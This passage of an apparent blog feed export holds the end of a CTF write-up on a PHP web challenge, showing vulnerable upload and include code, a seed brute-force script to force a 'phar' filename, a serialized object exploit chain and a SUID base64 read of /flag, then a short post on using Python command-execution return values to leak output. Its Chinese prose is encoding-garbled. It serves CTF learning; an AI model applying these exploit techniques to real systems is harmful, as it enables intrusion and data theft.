class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>                    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>                    <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br>                    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><br>                    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br>                    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&#x27;*&#x27;</span>);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                    &#125;<br><br>                    <span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>                    <span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br>                    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>                    <span class="hljs-variable">$uploadPath</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-variable">$newFilename</span>;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cp &quot;</span> . <span class="hljs-variable">$uploadedFile</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$uploadPath</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success upload!&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br><br>                    &#125;<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>æ£€æµ‹å¹¶includeçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/:\/\//&#x27;</span>, <span class="hljs-variable">$file</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br><br>                        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal content detected in the file.&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ä¼šå…ˆåˆ é™¤uploadsç›®å½•çš„æ–‡ä»¶ï¼Œç„¶åå†cpåˆ°uploadsç›®å½•</p><p>å› ä¸ºåŒä¸€åˆ†é’Ÿç±»ï¼Œæ–‡ä»¶åæ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•æ¡ä»¶ç«äº‰äº†</p><p>thread1ä¸Šä¼ æ–‡ä»¶ â€“&gt; thread1æ¸…ç©ºç›®å½• â€“&gt; thread1å†™å…¥æ–‡ä»¶ â€“&gt; thread2ä¸Šä¼ æ–‡ä»¶ â€“&gt; thread2æ¸…ç©ºç›®å½• â€“&gt; thread1å†…å®¹æ£€æµ‹ â€“&gt; thread1æ£€æµ‹é€šè¿‡ â€“&gt; thread2å†™å…¥æ–‡ä»¶ â€“&gt; thread1æ–‡ä»¶åŒ…å«</p><p><strong>æ€è·¯äºŒ</strong>ï¼šphar+gzipå‹ç¼©</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/</a></p><p>pharéå¸¸çµæ´»ï¼Œåªè¦ä½ æœ‰pharæ–‡ä»¶å¤´ï¼Œå¹¶ä¸”ä½ çš„æ–‡ä»¶åæœ‰.pharå­—ç¬¦ä¸²ï¼ˆä¸éœ€è¦åœ¨å°¾éƒ¨ï¼‰ï¼Œphpå°±å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶å½“æˆpharè§£æï¼Œå¹¶ä¸”æ˜¯å¯ä»¥å‹ç¼©çš„ï¼Œå‹ç¼©ä¹‹åå°±æ²¡æœ‰&lt;?phpäº†ï¼Œæ˜¾ç„¶å¯ä»¥ç»•è¿‡å†…å®¹æ£€æµ‹ï¼Œæ‰€ä»¥å”¯ä¸€çš„é—®é¢˜æ˜¯æ€ä¹ˆè®©æ–‡ä»¶ååŒ…å«.phar</p><p>åˆ†æä¸€ä¸‹æ–‡ä»¶åçš„è®¾ç½®é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br><span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åæ˜¯time.randomstr.jpgçš„æ ¼å¼</p><p>æ˜¾ç„¶åªéœ€è¦è®©randomstré‡Œé¢åŒ…å«pharå°±è¡Œäº†ï¼Œå› ä¸ºphpçš„éšæœºæ•°æ˜¯ä¼ªéšæœºï¼Œè¿™é‡Œçš„ç§å­æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºå“ªä¸ªç§å­èƒ½ç”ŸæˆåŒ…å«pharçš„å­—ç¬¦ä¸²</p><p>ç§å­çš„æ„æˆæ˜¯å½“å‰å°æ—¶å’Œåˆ†é’Ÿæ•°+è½¬æˆintä¹‹åå…¨å±€çš„filenameå˜é‡</p><p>è€Œå…¨å±€çš„filenameå˜é‡çš„å€¼æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag;<br></code></pre></td></tr></table></figure><p>readflagå±æ€§åˆæ˜¯å¯æ§çš„</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†çˆ†å‡ºæ¥çš„ç§å­ä¼ ç»™readflagï¼Œåœ¨ææ„çš„æ—¶å€™å°±å¯ä»¥ä¼ åˆ°filenameå˜é‡ï¼Œè¿™é‡Œå¯ä»¥å†™ä¸€ä¸ªéå¸¸ç®€å•çš„è„šæœ¬æ¥çˆ†ç ´ä¸€ä¸‹,ç›´æ¥å€Ÿé‰´ä¸€ä¸‹å¤§ä½¬çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilename</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>        <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>    &#125;<br>    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$filename</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$filename</span> &lt; <span class="hljs-number">2000000000</span>; <span class="hljs-variable">$filename</span>++) &#123;<br>        <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$s</span>, <span class="hljs-string">&#x27;phar&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;found: filename=<span class="hljs-subst">$filename</span> seed=<span class="hljs-subst">$seed</span> =&gt; <span class="hljs-subst">$s</span>\n&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$filename</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">getFilename</span>());<br><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">found: <span class="hljs-attribute">filename</span>=18112 <span class="hljs-attribute">seed</span>=110718112 =&gt; pharktae<br>18112<br></code></pre></td></tr></table></figure><p>æ³¨æ„è®¾ç½®æ—¶åŒºï¼Œä»¥æˆ‘å½“å‰çš„æ—¶é—´ä¸ºä¾‹ï¼Œçˆ†å‡ºæ¥æ˜¯18112ï¼Œäºæ˜¯ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„æ—¶å€™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;18112&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>å¯¹äºæœ€åä¸€æ­¥çš„ææƒå°±æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„suidææƒï¼Œbase64æœ‰sæƒé™ï¼Œç›´æ¥æ‰§è¡Œbase64 &#x2F;flagå°±è¡Œäº†</p><h1 id="æ€»ç»“ä¸åæ€"><a href="/2025/10/21/å¼ºç½‘æ¯2025wp/#æ€»ç»“ä¸åæ€" class="headerlink" title="æ€»ç»“ä¸åæ€"></a>æ€»ç»“ä¸åæ€</h1><p>phpååˆ†çµæ´»ï¼Œæœ‰å„ç§å„æ ·çš„ç”¨æ³•ï¼Œåšè¿™ç§é¢˜æ¯”è¾ƒè€ƒéªŒè€å¿ƒã€‚è¿™æ¬¡æ¯”èµ›ä¹Ÿè®©æˆ‘å¯¹è¦å®¡æºç çš„é¢˜æœ‰äº†ä¸€ç‚¹ç‚¹ä½“ä¼š</p><p><del>è™½ç„¶æ²¡å‡º</del></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶</title>
    <link href="/2025/10/14/%E5%85%B3%E4%BA%8Epython%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2025/10/14/%E5%85%B3%E4%BA%8Epython%E4%B8%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>äº‹æƒ…çš„å¼€å§‹æ˜¯åœ¨åšä¸€é“ctfé¢˜ç›®çš„æ—¶å€™å‘ç°ä¼šè¿”å›ä¸€ä¸ªæ•°å­—ï¼Œæ¯”å¦‚0ï¼Œ512 â€¦</p><p>åˆ†æäº†ä¸€ä¸‹å‘ç°å…¶å®æ˜¯pythonçš„os.systemæ‰§è¡Œå‘½ä»¤ä¹‹åè¿”å›çš„çŠ¶æ€ç ï¼Œäºæ˜¯æˆ‘å°±æƒ³åˆ°èƒ½å¦åˆ©ç”¨è¿™ä¸ªè¿”å›å€¼æ¥å¸¦å‡ºæ•°æ®å‘¢ï¼Œäºæ˜¯æˆ‘è¿›è¡Œäº†å¯¹å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æ¢ç´¢</p><h1 id="å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><h2 id="os-system"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#os-system" class="headerlink" title="os.system"></a>os.system</h2><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014193632120.png" alt="image-20251014193632120"></p><p>å¯ä»¥çœ‹åˆ°åœ¨å‘½ä»¤æ‰§è¡Œä¹‹åä¼šè¿”å›ä¸€ä¸ªæ•°å­—0ï¼Œ0å…¶å®å°±æ˜¯è¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p><p>å¦‚æœå¤±è´¥ä¼šè¿”å›ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬æ¥æ‰§è¡Œä¸€ä¸ªwindowsä¸­æ²¡æœ‰çš„å‘½ä»¤</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014193742216.png" alt="image-20251014193742216"></p><p>è¿”å›äº†1</p><p>å¯¹äºä¸ºä»€ä¹ˆä¼šè¿”å›è¿™äº›å€¼ï¼Œæˆ‘å»æŸ¥çœ‹äº†pythonçš„æºç </p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014195108166.png" alt="image-20251014195108166"></p><p>linuxä¸Šé¢çš„çš„è¿”å›ç»“æœä¸windowsæœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä½†æ˜¯å¦‚æœæ˜¯æ‰§è¡ŒæˆåŠŸçš„è¯éƒ½æ˜¯è¿”å›0</p><p>è¿™äº›æ•´æ•°æ˜¾ç„¶æ˜¯å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç ï¼Œç”¨æ¥åˆ¤æ–­å‘½ä»¤æ‰§è¡Œæ˜¯å¦æ­£å¸¸</p><p>ç”±äºè¿”å›å€¼ä¸å¯æ§ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ä»–æ¥å¸¦å‡ºæ•°æ®</p><h2 id="os-popen"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#os-popen" class="headerlink" title="os.popen"></a>os.popen</h2><p>æƒ³è¦å¸¦å‡ºè¾“å‡ºï¼Œä¸éš¾æƒ³åˆ°ä½¿ç”¨popenå‡½æ•°ï¼Œä»–çš„åŠŸèƒ½æ˜¯æ‰§è¡Œå‘½ä»¤å¹¶é€šè¿‡æ–‡ä»¶å¯¹è±¡æ¥å£è·å–è¾“å‡ºï¼Œé…åˆä¸Šread()å°±èƒ½æ•è·åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014195657210.png" alt="image-20251014195657210"></p><p>æ˜¾ç„¶è¿™ä¸ªæ˜¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¸¦å‡ºæ•°æ®çš„</p><h2 id="subprocess-run"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#subprocess-run" class="headerlink" title="subprocess.run"></a>subprocess.run</h2><p>subprocess.runå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014202046958.png" alt="image-20251014202046958"></p><p>å‚æ•°åˆ—è¡¨ä¸­æœ‰ä¸€ä¸ªå‚æ•°æ˜¯capture_outputï¼Œé»˜è®¤å€¼ä¸ºFalseï¼Œä¸ä¼šæ•è·è¾“å‡ºï¼Œå½“æˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºtrueçš„æ—¶å€™ï¼Œå°±èƒ½æ•è·åˆ°è¾“å‡º</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014202027844.png" alt="image-20251014202027844"></p><p>åŒæ ·ä¹Ÿå¯ä»¥ç”¨æ¥å¸¦å‡ºæ•°æ®</p><h2 id="subprocess-getoutput"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a>subprocess.getoutput</h2><p>æ³¨æ„åˆ°subprocessä¸­æœ‰ä¸€ä¸ªå‡½æ•°</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014202358814.png" alt="image-20251014202358814"></p><p>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼å°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼Œå®Œå…¨ç¬¦åˆæˆ‘ä»¬çš„ç›®çš„</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014202515246.png" alt="image-20251014202515246"></p><p>ç›´æ¥å°±å¯ä»¥å¸¦å‡ºæ•°æ®</p><h2 id="subprocess-getstatusoutput"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#subprocess-getstatusoutput" class="headerlink" title="subprocess.getstatusoutput"></a>subprocess.getstatusoutput</h2><p>è¿”å›å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç å’Œæ‰§è¡Œç»“æœ</p><p><img src="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/image-20251014202727404.png" alt="image-20251014202727404"></p><h1 id="æ€»ç»“"><a href="/2025/10/14/å…³äºpythonä¸­å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è¿”å›å€¼çš„ç ”ç©¶/#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æš‚æ—¶æ²¡æœ‰æƒ³åˆ°æœ‰ä»€ä¹ˆåˆ©ç”¨åœºæ™¯ï¼Œä½†æ˜¯æ„Ÿè§‰æ¢ç´¢çš„è¿‡ç¨‹è›®æœ‰æ„æ€çš„ï¼Œéšä¾¿è®°å½•ä¸€ä¸‹å•¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>å‘½ä»¤æ‰§è¡Œå‡½æ•°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025</title>
    <link href="/2025/09/23/WMCTF2025/"/>
    <url>/2025/09/23/WMCTF2025/</url>
    
